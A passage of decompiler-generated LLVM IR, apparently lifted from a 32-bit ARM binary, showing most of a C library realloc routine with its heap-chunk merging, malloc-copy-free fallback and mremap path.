  br i1 %v0_1312c, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_1312c
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1312c, %bb
  %v10_13140 = phi i32 [ %arg1, %dec_label_pc_1312c ], [ 0, %bb ]
  ret i32 %v10_13140

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_13144 = load i32, i32* @r4, align 4
  %v6_13144 = load i32, i32* @r5, align 4
  %v9_13144 = load i32, i32* @r6, align 4
  %v12_13144 = load i32, i32* @r7, align 4
  %v15_13144 = load i32, i32* @r8, align 4
  %v18_13144 = load i32, i32* @sb, align 4
  %v21_13144 = load i32, i32* @sl, align 4
  %v24_13144 = load i32, i32* @fp, align 4
  %v27_13144 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_13150 = icmp eq i32* %arg1, null
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_13150, label %dec_label_pc_13164, label %dec_label_pc_13174

dec_label_pc_13164:                               ; preds = %entry
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v1_13168 = call i32 @malloc(i32 %arg2)
  store i32 %v1_13168, i32* %r0.global-to-local, align 4
  store i32 %v1_13168, i32* @r4, align 4
  br label %dec_label_pc_134cc

dec_label_pc_13174:                               ; preds = %entry
  %v2_13174 = icmp eq i32 %arg2, 0
  br i1 %v2_13174, label %dec_label_pc_1317c, label %dec_label_pc_13188

dec_label_pc_1317c:                               ; preds = %dec_label_pc_13174
  %v0_1317c = call i32 @free()
  store i32 %v0_1317c, i32* %r0.global-to-local, align 4
  %v0_13180 = load i32, i32* @r6, align 4
  store i32 %v0_13180, i32* @r4, align 4
  br label %dec_label_pc_134cc

dec_label_pc_13188:                               ; preds = %dec_label_pc_13174
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_13190 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 72) to i32*), align 4
  store i32 %v4_13190, i32* @r4, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 %v4_13190, i32* %r2.global-to-local, align 4
  %v4_1319c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 36) to i32*), align 4
  store i32 %v4_1319c, i32* %r1.global-to-local, align 4
  %v2_131a0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_131a0, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_131a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_131a8)
  %v0_131b4 = load i32, i32* @r4, align 4
  store i32 %v0_131b4, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %r1.global-to-local, align 4
  %v4_131c0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 16) to i32*), align 4
  store i32 %v4_131c0, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_131cc.734 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_131c0)
  %v0_131cc = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_131cc, -32
  br i1 %tmp36, label %dec_label_pc_131e8, label %dec_label_pc_131d4

dec_label_pc_131d4:                               ; preds = %dec_label_pc_13188
  %v0_131d4 = call i32 @__GI___errno_location()
  store i32 %v0_131d4, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_131e0 = inttoptr i32 %v0_131d4 to i32*
  store i32 12, i32* %v2_131e0, align 4
  br label %dec_label_pc_134cc

dec_label_pc_131e8:                               ; preds = %dec_label_pc_13188
  %v1_131e8 = add i32 %v0_131cc, 11
  store i32 %v1_131e8, i32* %r0.global-to-local, align 4
  %v0_131ec = load i32, i32* @r5, align 4
  %v1_131ec = add i32 %v0_131ec, -4
  %v2_131ec = inttoptr i32 %v1_131ec to i32*
  %v3_131ec = load i32, i32* %v2_131ec, align 4
  store i32 %v3_131ec, i32* %r2.global-to-local, align 4
  %v2_131f0 = icmp ugt i32 %v1_131e8, 14
  %v7_131f0 = icmp eq i32 %v1_131e8, 15
  %v2_131f4 = xor i1 %v2_131f0, true
  %v3_131f4 = or i1 %v7_131f0, %v2_131f4
  br i1 %v3_131f4, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_131e8
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_131e8, %bb
  %v2_131f8 = xor i1 %v7_131f0, true
  %v3_131f8 = and i1 %v2_131f0, %v2_131f8
  br i1 %v3_131f8, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_131f8 = and i32 %v1_131e8, -8
  store i32 %v5_131f8, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_131fc = and i32 %v3_131ec, 2
  %v2_131fc = icmp eq i32 %v1_131fc, 0
  %v1_13200 = add i32 %v0_131ec, -8
  store i32 %v1_13200, i32* @sl, align 4
  %v1_13204 = and i32 %v3_131ec, -4
  store i32 %v1_13204, i32* @r6, align 4
  br i1 %v2_131fc, label %dec_label_pc_1320c, label %dec_label_pc_133e4

dec_label_pc_1320c:                               ; preds = %bb29
  %v1_1320c = load i32, i32* @sb, align 4
  %v3_1320c = icmp ult i32 %v1_13204, %v1_1320c
  br i1 %v3_1320c, label %dec_label_pc_13218, label %bb30

bb30:                                             ; preds = %dec_label_pc_1320c
  store i32 %v1_13204, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1337c

dec_label_pc_13218:                               ; preds = %dec_label_pc_1320c
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_13220 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 32) to i32*), align 4
  store i32 %v4_13220, i32* %r0.global-to-local, align 4
  %v1_13224 = add i32 %v4_13220, 44
  %v2_13224 = inttoptr i32 %v1_13224 to i32*
  %v3_13224 = load i32, i32* %v2_13224, align 4
  store i32 %v3_13224, i32* %r3.global-to-local, align 4
  %v2_13228 = add i32 %v1_13204, %v1_13200
  store i32 %v2_13228, i32* @r4, align 4
  %v9_1322c = icmp eq i32 %v2_13228, %v3_13224
  %v1_13230 = add i32 %v2_13228, 4
  %v2_13230 = inttoptr i32 %v1_13230 to i32*
  %v3_13230 = load i32, i32* %v2_13230, align 4
  store i32 %v3_13230, i32* %r1.global-to-local, align 4
  br i1 %v9_1322c, label %dec_label_pc_13238, label %dec_label_pc_13274

dec_label_pc_13238:                               ; preds = %dec_label_pc_13218
  %v1_13238 = and i32 %v3_13230, -4
  %v2_1323c = add i32 %v1_13238, %v1_13204
  store i32 %v2_1323c, i32* %r1.global-to-local, align 4
  %v1_13240 = add i32 %v1_1320c, 16
  store i32 %v1_13240, i32* %r3.global-to-local, align 4
  %v3_13244 = icmp ult i32 %v2_1323c, %v1_13240
  br i1 %v3_13244, label %dec_label_pc_132c8, label %dec_label_pc_1324c

dec_label_pc_1324c:                               ; preds = %dec_label_pc_13238
  %v2_1324c = sub i32 %v2_1323c, %v1_1320c
  %v1_13250 = urem i32 %v3_131ec, 2
  %v2_13254 = add i32 %v1_1320c, %v1_13200
  store i32 %v2_13254, i32* %r1.global-to-local, align 4
  %v2_13258 = or i32 %v1_1320c, %v1_13250
  store i32 %v2_13258, i32* %r2.global-to-local, align 4
  %v1_1325c = or i32 %v2_1324c, 1
  store i32 %v1_1325c, i32* %r3.global-to-local, align 4
  store i32 %v0_131ec, i32* @r4, align 4
  store i32 %v2_13258, i32* %v2_131ec, align 4
  %v0_13268 = load i32, i32* %r1.global-to-local, align 4
  %v1_13268 = load i32, i32* %r0.global-to-local, align 4
  %v2_13268 = add i32 %v1_13268, 44
  %v3_13268 = inttoptr i32 %v2_13268 to i32*
  store i32 %v0_13268, i32* %v3_13268, align 4
  %v0_1326c = load i32, i32* %r3.global-to-local, align 4
  %v1_1326c = load i32, i32* %r1.global-to-local, align 4
  %v2_1326c = add i32 %v1_1326c, 4
  %v3_1326c = inttoptr i32 %v2_1326c to i32*
  store i32 %v0_1326c, i32* %v3_1326c, align 4
  br label %dec_label_pc_134b0

dec_label_pc_13274:                               ; preds = %dec_label_pc_13218
  %v1_13274 = and i32 %v3_13230, -2
  %v2_13278 = add i32 %v1_13274, %v2_13228
  store i32 %v2_13278, i32* %r3.global-to-local, align 4
  %v1_1327c = add i32 %v2_13278, 4
  %v2_1327c = inttoptr i32 %v1_1327c to i32*
  %v3_1327c = load i32, i32* %v2_1327c, align 4
  store i32 %v3_1327c, i32* %r3.global-to-local, align 4
  %v1_13280 = urem i32 %v3_1327c, 2
  %v2_13280 = icmp eq i32 %v1_13280, 0
  br i1 %v2_13280, label %dec_label_pc_13288, label %dec_label_pc_132c8

dec_label_pc_13288:                               ; preds = %dec_label_pc_13274
  %v1_13288 = and i32 %v3_13230, -4
  store i32 %v1_13288, i32* %r3.global-to-local, align 4
  %v2_1328c = add i32 %v1_13288, %v1_13204
  store i32 %v2_1328c, i32* %r0.global-to-local, align 4
  %v3_13290 = icmp ult i32 %v2_1328c, %v1_1320c
  br i1 %v3_13290, label %dec_label_pc_132c8, label %dec_label_pc_13298

dec_label_pc_13298:                               ; preds = %dec_label_pc_13288
  %v1_13298 = add i32 %v1_13204, %v0_131ec
  %v2_13298 = inttoptr i32 %v1_13298 to i32*
  %v3_13298 = load i32, i32* %v2_13298, align 4
  store i32 %v3_13298, i32* %r1.global-to-local, align 4
  %v1_1329c = add i32 %v3_13298, 12
  %v2_1329c = inttoptr i32 %v1_1329c to i32*
  %v3_1329c = load i32, i32* %v2_1329c, align 4
  store i32 %v3_1329c, i32* %r3.global-to-local, align 4
  %v9_132a0 = icmp eq i32 %v3_1329c, %v2_13228
  %v1_132a4 = add i32 %v2_13228, 12
  %v2_132a4 = inttoptr i32 %v1_132a4 to i32*
  %v3_132a4 = load i32, i32* %v2_132a4, align 4
  store i32 %v3_132a4, i32* %r2.global-to-local, align 4
  br i1 %v9_132a0, label %dec_label_pc_132ac, label %dec_label_pc_132b8

dec_label_pc_132ac:                               ; preds = %dec_label_pc_13298
  %v1_132ac = add i32 %v3_132a4, 8
  %v2_132ac = inttoptr i32 %v1_132ac to i32*
  %v3_132ac = load i32, i32* %v2_132ac, align 4
  store i32 %v3_132ac, i32* %r3.global-to-local, align 4
  %v9_132b0 = icmp eq i32 %v3_132ac, %v2_13228
  br i1 %v9_132b0, label %dec_label_pc_132bc, label %dec_label_pc_132b8

dec_label_pc_132b8:                               ; preds = %dec_label_pc_13298, %dec_label_pc_132ac
  %v0_132b8 = call i32 @abort()
  store i32 %v0_132b8, i32* %r0.global-to-local, align 4
  %v0_132bc.pre = load i32, i32* @r1, align 4
  %v1_132bc.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_132bc

dec_label_pc_132bc:                               ; preds = %dec_label_pc_132ac, %dec_label_pc_132b8
  %v1_132bc = phi i32 [ %v3_132a4, %dec_label_pc_132ac ], [ %v1_132bc.pre, %dec_label_pc_132b8 ]
  %v0_132bc = phi i32 [ %v3_13298, %dec_label_pc_132ac ], [ %v0_132bc.pre, %dec_label_pc_132b8 ]
  %v2_132bc = add i32 %v1_132bc, 8
  %v3_132bc = inttoptr i32 %v2_132bc to i32*
  store i32 %v0_132bc, i32* %v3_132bc, align 4
  %v0_132c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_132c0 = load i32, i32* %r1.global-to-local, align 4
  %v2_132c0 = add i32 %v1_132c0, 12
  %v3_132c0 = inttoptr i32 %v2_132c0 to i32*
  store i32 %v0_132c0, i32* %v3_132c0, align 4
  %v1_1337c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1337c

dec_label_pc_132c8:                               ; preds = %dec_label_pc_13238, %dec_label_pc_13288, %dec_label_pc_13274
  %v1_132c8 = add i32 %v1_1320c, -7
  store i32 %v1_132c8, i32* %r0.global-to-local, align 4
  %v1_132cc = call i32 @malloc(i32 %v1_132c8)
  store i32 %v1_132cc, i32* @r0, align 4
  store i32 %v1_132cc, i32* %r1.global-to-local, align 4
  %v2_132d0 = icmp eq i32 %v1_132cc, 0
  br i1 %v2_132d0, label %bb31, label %dec_label_pc_132dc

bb31:                                             ; preds = %dec_label_pc_132c8
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_134b0

dec_label_pc_132dc:                               ; preds = %dec_label_pc_132c8
  %v1_132e4.pre = load i32, i32* @r4, align 4
  %v1_132dc = add i32 %v1_132cc, -4
  %v2_132dc = inttoptr i32 %v1_132dc to i32*
  %v3_132dc = load i32, i32* %v2_132dc, align 4
  store i32 %v3_132dc, i32* @r3, align 4
  %v1_132e0 = add i32 %v1_132cc, -8
  store i32 %v1_132e0, i32* @r7, align 4
  %v9_132e4 = icmp eq i32 %v1_132e0, %v1_132e4.pre
  br i1 %v9_132e4, label %.thread2, label %dec_label_pc_132f4

.thread2:                                         ; preds = %dec_label_pc_132dc
  %v2_132e8 = and i32 %v3_132dc, -4
  store i32 %v2_132e8, i32* %r3.global-to-local, align 4
  %v2_132ec = load i32, i32* @r6, align 4
  %v3_132ec = add i32 %v2_132ec, %v2_132e8
  store i32 %v3_132ec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1337c

dec_label_pc_132f4:                               ; preds = %dec_label_pc_132dc
  %v0_132f4 = load i32, i32* @r6, align 4
  %v1_132f4 = add i32 %v0_132f4, -4
  store i32 %v1_132f4, i32* @r2, align 4
  %v3_132f8 = udiv i32 %v1_132f4, 4
  store i32 %v3_132f8, i32* @ip, align 4
  %tmp37 = and i32 %v1_132f4, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_13300 = icmp ult i32 %v1_132f4, 36
  %v3_13300 = or i1 %tmp38, %v2_13300
  %v0_13310 = load i32, i32* @r5, align 4
  br i1 %v3_13300, label %dec_label_pc_13310, label %dec_label_pc_13304

dec_label_pc_13304:                               ; preds = %dec_label_pc_132f4
  store i32 %v0_13310, i32* @r1, align 4
  %v0_13308 = call i32 @memcpy()
  store i32 %v0_13308, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_13310:                               ; preds = %dec_label_pc_132f4
  %v1_13310 = inttoptr i32 %v0_13310 to i32*
  %v2_13310 = load i32, i32* %v1_13310, align 4
  store i32 %v2_13310, i32* %r3.global-to-local, align 4
  %v2_13314 = inttoptr i32 %v1_132cc to i32*
  store i32 %v2_13310, i32* %v2_13314, align 4
  %v0_13318 = load i32, i32* @r5, align 4
  %v1_13318 = add i32 %v0_13318, 4
  %v2_13318 = inttoptr i32 %v1_13318 to i32*
  %v3_13318 = load i32, i32* %v2_13318, align 4
  store i32 %v3_13318, i32* %r3.global-to-local, align 4
  %v1_1331c = load i32, i32* %r1.global-to-local, align 4
  %v2_1331c = add i32 %v1_1331c, 4
  %v3_1331c = inttoptr i32 %v2_1331c to i32*
  store i32 %v3_13318, i32* %v3_1331c, align 4
  %v0_13320 = load i32, i32* @r5, align 4
  %v1_13320 = add i32 %v0_13320, 8
  %v2_13320 = inttoptr i32 %v1_13320 to i32*
  %v3_13320 = load i32, i32* %v2_13320, align 4
  store i32 %v3_13320, i32* %r3.global-to-local, align 4
  %v0_13324 = load i32, i32* @ip, align 4
  %v1_13328 = load i32, i32* %r1.global-to-local, align 4
  %v2_13328 = add i32 %v1_13328, 8
  %v3_13328 = inttoptr i32 %v2_13328 to i32*
  store i32 %v3_13320, i32* %v3_13328, align 4
  %tmp39 = icmp ult i32 %v0_13324, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_13330

dec_label_pc_13330:                               ; preds = %dec_label_pc_13310
  %v0_13330 = load i32, i32* @r5, align 4
  %v1_13330 = add i32 %v0_13330, 12
  %v2_13330 = inttoptr i32 %v1_13330 to i32*
  %v3_13330 = load i32, i32* %v2_13330, align 4
  store i32 %v3_13330, i32* %r3.global-to-local, align 4
  %v1_13334 = load i32, i32* %r1.global-to-local, align 4
  %v2_13334 = add i32 %v1_13334, 12
  %v3_13334 = inttoptr i32 %v2_13334 to i32*
  store i32 %v3_13330, i32* %v3_13334, align 4
  %v0_13338 = load i32, i32* @r5, align 4
  %v1_13338 = add i32 %v0_13338, 16
  %v2_13338 = inttoptr i32 %v1_13338 to i32*
  %v3_13338 = load i32, i32* %v2_13338, align 4
  store i32 %v3_13338, i32* %r3.global-to-local, align 4
  %v0_1333c = load i32, i32* @ip, align 4
  %v1_13340 = load i32, i32* %r1.global-to-local, align 4
  %v2_13340 = add i32 %v1_13340, 16
  %v3_13340 = inttoptr i32 %v2_13340 to i32*
  store i32 %v3_13338, i32* %v3_13340, align 4
  %tmp40 = icmp ult i32 %v0_1333c, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_13348

dec_label_pc_13348:                               ; preds = %dec_label_pc_13330
  %v0_13348 = load i32, i32* @r5, align 4
  %v1_13348 = add i32 %v0_13348, 20
  %v2_13348 = inttoptr i32 %v1_13348 to i32*
  %v3_13348 = load i32, i32* %v2_13348, align 4
  store i32 %v3_13348, i32* %r3.global-to-local, align 4
  %v1_1334c = load i32, i32* %r1.global-to-local, align 4
  %v2_1334c = add i32 %v1_1334c, 20
  %v3_1334c = inttoptr i32 %v2_1334c to i32*
  store i32 %v3_13348, i32* %v3_1334c, align 4
  %v0_13350 = load i32, i32* @r5, align 4
  %v1_13350 = add i32 %v0_13350, 24
  %v2_13350 = inttoptr i32 %v1_13350 to i32*
  %v3_13350 = load i32, i32* %v2_13350, align 4
  store i32 %v3_13350, i32* %r3.global-to-local, align 4
  %v1_13354 = load i32, i32* %r1.global-to-local, align 4
  %v2_13354 = add i32 %v1_13354, 24
  %v3_13354 = inttoptr i32 %v2_13354 to i32*
  store i32 %v3_13350, i32* %v3_13354, align 4
  %v0_13358 = load i32, i32* @ip, align 4
  %v7_13358 = icmp eq i32 %v0_13358, 9
  br i1 %v7_13358, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_13348
  %v1_1335c = load i32, i32* @r5, align 4
  %v2_1335c = add i32 %v1_1335c, 28
  %v3_1335c = inttoptr i32 %v2_1335c to i32*
  %v4_1335c = load i32, i32* %v3_1335c, align 4
  store i32 %v4_1335c, i32* %r3.global-to-local, align 4
  %v2_13360 = load i32, i32* %r1.global-to-local, align 4
  %v3_13360 = add i32 %v2_13360, 28
  %v4_13360 = inttoptr i32 %v3_13360 to i32*
  store i32 %v4_1335c, i32* %v4_13360, align 4
  %v1_13364 = load i32, i32* @r5, align 4
  %v2_13364 = add i32 %v1_13364, 32
  %v3_13364 = inttoptr i32 %v2_13364 to i32*
  %v4_13364 = load i32, i32* %v3_13364, align 4
  store i32 %v4_13364, i32* %r3.global-to-local, align 4
  %v2_13368 = load i32, i32* %r1.global-to-local, align 4
  %v3_13368 = add i32 %v2_13368, 32
  %v4_13368 = inttoptr i32 %v3_13368 to i32*
  store i32 %v4_13364, i32* %v4_13368, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_13348, %dec_label_pc_13330, %dec_label_pc_13310, %dec_label_pc_13304, %bb32
  %v0_1336c = load i32, i32* @r5, align 4
  store i32 %v0_1336c, i32* @r0, align 4
  %v0_13370 = call i32 @free()
  store i32 %v0_13370, i32* %r0.global-to-local, align 4
  %v0_13374 = load i32, i32* @r7, align 4
  %v1_13374 = add i32 %v0_13374, 8
  store i32 %v1_13374, i32* @r4, align 4
  br label %dec_label_pc_134b0

dec_label_pc_1337c:                               ; preds = %bb30, %.thread2, %dec_label_pc_132bc
  %v0_13390 = phi i32 [ %v3_132ec, %.thread2 ], [ %v1_13204, %bb30 ], [ %v1_1337c.pre, %dec_label_pc_132bc ]
  %v0_1337c = load i32, i32* @sb, align 4
  %v2_1337c = sub i32 %v0_13390, %v0_1337c
  store i32 %v2_1337c, i32* %r1.global-to-local, align 4
  %v0_13384 = load i32, i32* @sl, align 4
  %v1_13384 = add i32 %v0_13384, 4
  %v2_13384 = inttoptr i32 %v1_13384 to i32*
  %v3_13384 = load i32, i32* %v2_13384, align 4
  %tmp41 = icmp ugt i32 %v2_1337c, 15
  %v1_133ac = urem i32 %v3_13384, 2
  store i32 %v1_133ac, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_133ac, label %dec_label_pc_1338c

dec_label_pc_1338c:                               ; preds = %dec_label_pc_1337c
  %v2_13390 = or i32 %v1_133ac, %v0_13390
  store i32 %v2_13390, i32* %r3.global-to-local, align 4
  store i32 %v2_13390, i32* %v2_13384, align 4
  %v0_13398 = load i32, i32* @sl, align 4
  %v1_13398 = load i32, i32* %r0.global-to-local, align 4
  %v2_13398 = add i32 %v1_13398, %v0_13398
  store i32 %v2_13398, i32* %r2.global-to-local, align 4
  %v1_1339c = add i32 %v2_13398, 4
  %v2_1339c = inttoptr i32 %v1_1339c to i32*
  %v3_1339c = load i32, i32* %v2_1339c, align 4
  %v1_133a0 = or i32 %v3_1339c, 1
  store i32 %v1_133a0, i32* %r3.global-to-local, align 4
  store i32 %v1_133a0, i32* %v2_1339c, align 4
  br label %dec_label_pc_133dc

dec_label_pc_133ac:                               ; preds = %dec_label_pc_1337c
  %v2_133b0 = add i32 %v0_13384, %v0_1337c
  store i32 %v2_133b0, i32* %r0.global-to-local, align 4
  %v2_133b4 = or i32 %v1_133ac, %v0_1337c
  store i32 %v2_133b4, i32* %r3.global-to-local, align 4
  %v1_133b8 = or i32 %v2_1337c, 1
  store i32 %v1_133b8, i32* %r2.global-to-local, align 4
  store i32 %v2_133b4, i32* %v2_13384, align 4
  %v0_133c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_133c0 = load i32, i32* %r0.global-to-local, align 4
  %v2_133c0 = add i32 %v1_133c0, 4
  %v3_133c0 = inttoptr i32 %v2_133c0 to i32*
  store i32 %v0_133c0, i32* %v3_133c0, align 4
  %v0_133c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_133c4 = load i32, i32* %r1.global-to-local, align 4
  %v2_133c4 = add i32 %v1_133c4, %v0_133c4
  store i32 %v2_133c4, i32* %r2.global-to-local, align 4
  %v1_133c8 = add i32 %v2_133c4, 4
  %v2_133c8 = inttoptr i32 %v1_133c8 to i32*
  %v3_133c8 = load i32, i32* %v2_133c8, align 4
  %v1_133cc = or i32 %v3_133c8, 1
  store i32 %v1_133cc, i32* %r3.global-to-local, align 4
  store i32 %v1_133cc, i32* %v2_133c8, align 4
  %v0_133d4 = load i32, i32* %r0.global-to-local, align 4
  %v1_133d4 = add i32 %v0_133d4, 8
  store i32 %v1_133d4, i32* @r0, align 4
  %v0_133d8 = call i32 @free()
  store i32 %v0_133d8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_133dc

dec_label_pc_133dc:                               ; preds = %dec_label_pc_1338c, %dec_label_pc_133ac
  %v0_133dc = load i32, i32* @sl, align 4
  %v1_133dc = add i32 %v0_133dc, 8
  store i32 %v1_133dc, i32* @r4, align 4
  br label %dec_label_pc_134b0

dec_label_pc_133e4:                               ; preds = %bb29
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %r1.global-to-local, align 4
  %v4_133ec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 32) to i32*), align 4
  store i32 %v4_133ec, i32* @r8, align 4
  %v2_133f0 = inttoptr i32 %v1_13200 to i32*
  %v3_133f0 = load i32, i32* %v2_133f0, align 4
  store i32 %v3_133f0, i32* @r4, align 4
  %v1_133f4 = add i32 %v4_133ec, 860
  %v2_133f4 = inttoptr i32 %v1_133f4 to i32*
  %v3_133f4 = load i32, i32* %v2_133f4, align 4
  %v1_133f8 = add i32 %v3_133f0, 4
  %v1_133fc = add i32 %v3_133f4, -1
  store i32 %v1_133fc, i32* %r2.global-to-local, align 4
  %v2_13400 = add i32 %v1_133f8, %v1_133fc
  %v1_13404 = load i32, i32* @sb, align 4
  %v2_13404 = add i32 %v2_13400, %v1_13404
  store i32 %v2_13404, i32* %r3.global-to-local, align 4
  %v2_13408 = sub i32 0, %v3_133f4
  %v3_13408 = and i32 %v2_13404, %v2_13408
  store i32 %v3_13408, i32* @r7, align 4
  %v2_1340c = sub i32 %v3_13408, %v3_133f0
  store i32 %v2_1340c, i32* @fp, align 4
  %v9_13410 = icmp eq i32 %v1_13204, %v2_1340c
  br i1 %v9_13410, label %dec_label_pc_13484, label %dec_label_pc_13418

dec_label_pc_13418:                               ; preds = %dec_label_pc_133e4
  %v2_13418 = sub i32 %v1_13200, %v3_133f0
  store i32 %v2_13418, i32* %r0.global-to-local, align 4
  %v2_1341c = add i32 %v3_133f0, %v1_13204
  store i32 %v2_1341c, i32* %r1.global-to-local, align 4
  store i32 %v3_13408, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_13428 = call i32 @mremap(i32 %v2_13418, i32 %v2_1341c, i32 %v3_13408, i32 1)
  store i32 %v4_13428, i32* %r0.global-to-local, align 4
  %v7_1342c = icmp eq i32 %v4_13428, -1
  br i1 %v7_1342c, label %dec_label_pc_13478, label %dec_label_pc_13434

dec_label_pc_13434:                               ; preds = %dec_label_pc_13418
  %v1_13434 = load i32, i32* @r4, align 4
  %v2_13434 = add i32 %v1_13434, %v4_13428
  store i32 %v2_13434, i32* %r0.global-to-local, align 4
  %v0_13438 = load i32, i32* @fp, align 4
  %v1_13438 = or i32 %v0_13438, 2
  store i32 %v1_13438, i32* %r3.global-to-local, align 4
  %v2_1343c = add i32 %v2_13434, 4
  %v3_1343c = inttoptr i32 %v2_1343c to i32*
  store i32 %v1_13438, i32* %v3_1343c, align 4
  %v0_13440 = load i32, i32* @r8, align 4
  %v1_13440 = add i32 %v0_13440, 868
  %v2_13440 = inttoptr i32 %v1_13440 to i32*
  %v3_13440 = load i32, i32* %v2_13440, align 4
  store i32 %v3_13440, i32* %r3.global-to-local, align 4
  %v1_13444 = add i32 %v0_13440, 880
  %v2_13444 = inttoptr i32 %v1_13444 to i32*
  %v3_13444 = load i32, i32* %v2_13444, align 4
  store i32 %v3_13444, i32* %r2.global-to-local, align 4
  %v0_13448 = load i32, i32* @r6, align 4
  %v2_13448 = sub i32 %v3_13440, %v0_13448
  store i32 %v2_13448, i32* %r3.global-to-local, align 4
  %v1_1344c = load i32, i32* @r7, align 4
  %v2_1344c = add i32 %v1_1344c, %v2_13448
  store i32 %v2_1344c, i32* %r1.global-to-local, align 4
  %v1_13450 = add i32 %v0_13440, 872
  %v2_13450 = inttoptr i32 %v1_13450 to i32*
  %v3_13450 = load i32, i32* %v2_13450, align 4
  store i32 %v3_13450, i32* %r3.global-to-local, align 4
  %v1_13458 = add i32 %v0_13440, 884
  %v2_13458 = inttoptr i32 %v1_13458 to i32*
  %v3_13458 = load i32, i32* %v2_13458, align 4
  store i32 %v3_13458, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_1344c, %v3_13444
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_13434
  store i32 %v2_1344c, i32* %v2_13444, align 4
  %v0_13460.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_13460.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_13434, %bb33
  %v1_13460 = phi i32 [ %v0_13440, %dec_label_pc_13434 ], [ %v1_13460.pre, %bb33 ]
  %v0_13460 = phi i32 [ %v2_1344c, %dec_label_pc_13434 ], [ %v0_13460.pre, %bb33 ]
  %v2_13460 = add i32 %v1_13460, 868
  %v3_13460 = inttoptr i32 %v2_13460 to i32*
  store i32 %v0_13460, i32* %v3_13460, align 4
  %v0_13464 = load i32, i32* %r1.global-to-local, align 4
  %v1_13464 = load i32, i32* %r3.global-to-local, align 4
  %v2_13464 = add i32 %v1_13464, %v0_13464
  store i32 %v2_13464, i32* %r1.global-to-local, align 4
  %v1_13468 = load i32, i32* %r2.global-to-local, align 4
  %v0_1346c = load i32, i32* %r0.global-to-local, align 4
  %v1_1346c = add i32 %v0_1346c, 8
  store i32 %v1_1346c, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_13464, %v1_13468
  br i1 %tmp43, label %bb35, label %dec_label_pc_134b0

bb35:                                             ; preds = %bb34
  %v5_13470 = load i32, i32* @r8, align 4
  %v6_13470 = add i32 %v5_13470, 884
  %v7_13470 = inttoptr i32 %v6_13470 to i32*
  store i32 %v2_13464, i32* %v7_13470, align 4
  br label %dec_label_pc_134b0

dec_label_pc_13478:                               ; preds = %dec_label_pc_13418
  %v0_13478 = load i32, i32* @sb, align 4
  %v1_13478 = add i32 %v0_13478, 4
  store i32 %v1_13478, i32* %r3.global-to-local, align 4
  %v0_1347c = load i32, i32* @r6, align 4
  %v3_1347c = icmp ult i32 %v0_1347c, %v1_13478
  br i1 %v3_1347c, label %dec_label_pc_1348c, label %dec_label_pc_13478.dec_label_pc_13484_crit_edge

dec_label_pc_13478.dec_label_pc_13484_crit_edge:  ; preds = %dec_label_pc_13478
